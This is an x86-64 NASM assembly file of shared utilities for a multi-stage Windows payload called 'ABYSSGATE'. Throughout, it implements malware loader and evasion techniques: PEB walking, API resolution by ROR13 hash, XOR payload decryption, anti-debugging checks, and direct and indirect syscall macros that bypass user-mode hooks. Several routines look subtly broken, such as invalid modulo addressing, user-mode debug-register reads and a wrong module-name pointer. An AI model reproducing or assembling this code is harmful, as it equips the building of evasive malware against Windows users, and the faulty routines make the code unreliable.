; =============================================================================
; ABYSSGATE Common Utilities
; Shared macros and functions across all stages
; =============================================================================

; =============================================================================
; MACROS
; =============================================================================

; Get current RIP (position independent)
%macro GET_RIP 1
    call %%get_rip
%%get_rip:
    pop %1
    sub %1, %%get_rip
%endmacro

; Save all non-volatile registers
%macro SAVE_REGS 0
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
%endmacro

; Restore all non-volatile registers
%macro RESTORE_REGS 0
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
%endmacro

; Setup stack frame
%macro SETUP_FRAME 1
    push rbp
    mov rbp, rsp
    sub rsp, %1
%endmacro

; Cleanup stack frame
%macro CLEANUP_FRAME 0
    mov rsp, rbp
    pop rbp
%endmacro

; =============================================================================
; CONSTANTS - Windows 11 25H2 Specific
; =============================================================================

; PEB Offsets (consistent across Win10/11)
PEB_BASE                    equ 0x60
PEB_BEINGDEBUGGED           equ 0x02
PEB_LDR                     equ 0x18
PEB_PROCESSHEAP             equ 0x30
PEB_NTGLOBALFLAG            equ 0xBC
PEB_CET_BITMAPS             equ 0xEC

; LDR_DATA_TABLE_ENTRY Offsets
LDR_INLOADORDER             equ 0x10
LDR_DLLBASE                 equ 0x30
LDR_BASEDLLNAME             equ 0x58

; PE Header Offsets
PE_LFANEW                   equ 0x3C
PE_EXPORTDIR                equ 0x88

; Export Directory Offsets
EXP_NUMBEROFNAMES           equ 0x18
EXP_ADDRESSOFNAMES          equ 0x20
EXP_ADDRESSOFORDINALS       equ 0x24
EXP_ADDRESSOFFUNCTIONS      equ 0x1C

; Memory Constants
MEM_COMMIT                  equ 0x1000
MEM_RESERVE                 equ 0x2000
MEM_COMMIT_RESERVE          equ 0x3000
PAGE_EXECUTE_READWRITE      equ 0x40
PAGE_READWRITE            equ 0x04

; =============================================================================
; HASH ALGORITHMS
; =============================================================================

; Custom hash: ROR13 + ADD
; Standard for many shellcodes (Metasploit, Cobalt Strike style)
hash_ror13:
    push rbx
    push rsi
    mov rsi, rcx                ; String pointer
    xor eax, eax                ; Hash accumulator
    xor ebx, ebx

.loop:
    movzx ebx, byte [rsi]
    test ebx, ebx
    jz .done

    ror eax, 13
    add eax, ebx

    inc rsi
    jmp .loop

.done:
    pop rsi
    pop rbx
    ret

; Unicode string hash (for module names)
hash_unicode_ror13:
    push rbx
    push rsi
    mov rsi, rcx
    xor eax, eax
    xor ebx, ebx

.loop:
    movzx ebx, word [rsi]
    test ebx, ebx
    jz .done

    ; Convert to uppercase
    cmp ebx, 'a'
    jb .no_convert
    cmp ebx, 'z'
    ja .no_convert
    sub ebx, 0x20

.no_convert:
    ror eax, 13
    add eax, ebx

    add rsi, 2
    jmp .loop

.done:
    pop rsi
    pop rbx
    ret

; =============================================================================
; PEB WALKING
; =============================================================================

; Get PEB address in RAX
get_peb:
    mov rax, gs:[PEB_BASE]
    ret

; Get Ldr address in RAX
get_ldr:
    call get_peb
    mov rax, [rax + PEB_LDR]
    ret

; Get first module in InLoadOrderModuleList
; Returns: RAX = LDR_DATA_TABLE_ENTRY pointer
get_first_module:
    call get_ldr
    lea rax, [rax + LDR_INLOADORDER]
    mov rax, [rax]              ; Flink = first entry
    ret

; Get module base by hash
; RCX = hash value
; Returns: RAX = module base (0 if not found)
get_module_by_hash:
    push rbx
    push rsi
    push rdi
    push r12

    mov r12, rcx                ; R12 = target hash
    call get_first_module
    mov rdi, rax                ; RDI = current entry
    call get_ldr
    lea rsi, [rax + LDR_INLOADORDER] ; RSI = list head

.loop:
    ; Get module base
    mov rax, [rdi + LDR_DLLBASE]
    test rax, rax
    jz .next

    ; Get module name
    mov rcx, [rdi + LDR_BASEDLLNAME]
    test rcx, rcx
    jz .next

    call hash_unicode_ror13
    cmp eax, r12d
    je .found

.next:
    mov rdi, [rdi]              ; Flink
    cmp rdi, rsi                ; Back to head?
    jne .loop

    ; Not found
    xor eax, eax
    jmp .done

.found:
    mov rax, [rdi + LDR_DLLBASE]

.done:
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; =============================================================================
; PE PARSING
; =============================================================================

; Get export directory from module base
; RCX = module base
; Returns: RAX = export directory VA (0 if error)
get_export_directory:
    push rbx
    mov rbx, rcx

    ; Check DOS signature
    cmp word [rbx], 0x5A4D      ; "MZ"
    jne .error

    ; Get PE header
    mov eax, [rbx + PE_LFANEW]
    add rax, rbx

    ; Check PE signature
    cmp dword [rax], 0x00004550 ; "PE\0\0"
    jne .error

    ; Get export directory RVA
    mov eax, [rax + PE_EXPORTDIR]
    test eax, eax
    jz .error

    add rax, rbx                ; VA = RVA + base
    jmp .done

.error:
    xor eax, eax

.done:
    pop rbx
    ret

; Get function address by hash from module
; RCX = module base, RDX = function hash
; Returns: RAX = function address (0 if not found)
get_proc_by_hash:
    push rbx
    push r12
    push r13
    push r14
    push r15
    push rsi
    push rdi

    mov r12, rcx                ; R12 = module base
    mov r13, rdx                ; R13 = target hash

    ; Get export directory
    call get_export_directory
    test rax, rax
    jz .not_found
    mov r14, rax                ; R14 = export directory

    ; Get export arrays
    mov r8d, [r14 + EXP_ADDRESSOFNAMES]
    add r8, r12                 ; R8 = AddressOfNames
    mov r9d, [r14 + EXP_ADDRESSOFORDINALS]
    add r9, r12                 ; R9 = AddressOfNameOrdinals
    mov r10d, [r14 + EXP_ADDRESSOFFUNCTIONS]
    add r10, r12                ; R10 = AddressOfFunctions

    xor rsi, rsi                ; Index
    mov ecx, [r14 + EXP_NUMBEROFNAMES]

.loop:
    cmp esi, ecx
    jae .not_found

    ; Get function name
    mov eax, [r8 + rsi*4]       ; Name RVA
    add rax, r12                ; Name VA

    ; Hash function name
    push rcx
    push rsi
    mov rcx, rax
    call hash_ror13
    pop rsi
    pop rcx

    cmp eax, r13d
    je .found

    inc rsi
    jmp .loop

.found:
    ; Get ordinal
    movzx eax, word [r9 + rsi*2]
    ; Get function address
    mov eax, [r10 + rax*4]      ; Function RVA
    add rax, r12                ; Function VA
    jmp .done

.not_found:
    xor eax, eax

.done:
    pop rdi
    pop rsi
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret

; =============================================================================
; MEMORY OPERATIONS
; =============================================================================

; Secure memory wipe
; RCX = address, RDX = length
secure_zero:
    push rdi
    push rcx
    push rdx

    mov rdi, rcx
    mov rcx, rdx
    xor eax, eax
    rep stosb

    pop rdx
    pop rcx
    pop rdi
    ret

; Copy memory
; RCX = dest, RDX = src, R8 = length
memcpy:
    push rsi
    push rdi
    push rcx

    mov rdi, rcx
    mov rsi, rdx
    mov rcx, r8
    rep movsb

    pop rcx
    pop rdi
    pop rsi
    ret

; =============================================================================
; CRYPTO HELPERS
; =============================================================================

; XOR encrypt/decrypt (symmetric)
; RCX = data, RDX = length, R8 = key, R9 = key length
xor_crypt:
    push rsi
    push rdi
    push rbx

    mov rdi, rcx
    mov rsi, rdx
    mov rbx, r8
    mov rcx, r9

    xor rdx, rdx                ; Index

.loop:
    cmp rdx, rsi
    jae .done

    mov al, [rdi + rdx]
    xor al, [rbx + rdx % rcx]
    mov [rdi + rdx], al

    inc rdx
    jmp .loop

.done:
    pop rbx
    pop rdi
    pop rsi
    ret

; =============================================================================
; ANTI-ANALYSIS HELPERS
; =============================================================================

; Check if running under debugger (PEB method)
; Returns: EAX = 1 if debugged, 0 if not
check_debug_peb:
    call get_peb
    movzx eax, byte [rax + PEB_BEINGDEBUGGED]
    ret

; Check NtGlobalFlag
; Returns: EAX = flags (non-zero if debugged)
check_ntglobalflag:
    call get_peb
    mov eax, [rax + PEB_NTGLOBALFLAG]
    and eax, 0x70               ; Debug flags only
    ret

; Check heap flags
; Returns: EAX = 1 if debug heap detected
check_heap_debug:
    call get_peb
    mov rax, [rax + PEB_PROCESSHEAP]
    test rax, rax
    jz .no_heap

    mov edx, [rax + 0x40]       ; Heap Flags
    test edx, 0x40000000        ; HEAP_TAIL_CHECKING
    jnz .debug_heap

.no_heap:
    xor eax, eax
    ret

.debug_heap:
    mov eax, 1
    ret

; Check hardware breakpoints
; Returns: EAX = 1 if hardware BP detected
check_hw_breakpoints:
    push rbx

    mov rbx, dr0
    test rbx, rbx
    jnz .hwbp_found
    mov rbx, dr1
    test rbx, rbx
    jnz .hwbp_found
    mov rbx, dr2
    test rbx, rbx
    jnz .hwbp_found
    mov rbx, dr3
    test rbx, rbx
    jnz .hwbp_found

    mov rbx, dr7
    and rbx, 0xFF               ; Check L0-L3
    test rbx, rbx
    jnz .hwbp_found

    xor eax, eax
    pop rbx
    ret

.hwbp_found:
    mov eax, 1
    pop rbx
    ret

; =============================================================================
; SYSCALL HELPERS (Windows 11 25H2)
; =============================================================================

; Syscall numbers for Windows 11 25H2 (Build 26200.8039)
; These are relatively stable but should be verified
SYSCALL_NTALLOCATEVIRTUALMEMORY     equ 0x0018
SYSCALL_NTPROTECTVIRTUALMEMORY      equ 0x0050
SYSCALL_NTCREATETHREADEX            equ 0x00C7
SYSCALL_NTQUEUEAPCTHREAD            equ 0x0045
SYSCALL_NTDELAYEXECUTION            equ 0x0034
SYSCALL_NTQUERYINFORMATIONPROCESS   equ 0x0019

; Direct syscall macro
%macro DIRECT_SYSCALL 1
    mov r10, rcx
    mov eax, %1
    syscall
%endmacro

; Indirect syscall - jump to syscall instruction in ntdll
; Requires setup of syscall address first
%macro INDIRECT_SYSCALL 0
    mov r10, rcx
    mov eax, [syscall_ssn]
    jmp QWORD [syscall_addr]
%endmacro
